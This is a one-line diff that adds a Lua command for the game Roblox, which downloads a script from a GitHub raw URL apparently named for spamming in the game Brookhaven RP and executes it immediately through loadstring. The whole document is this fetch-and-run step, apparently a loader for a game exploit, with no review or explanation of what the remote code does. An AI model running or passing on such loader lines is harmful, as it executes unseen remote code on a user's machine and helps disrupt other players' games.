@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/brookhaven-rp-spam1-wasgop40h04qy7.lua"))()
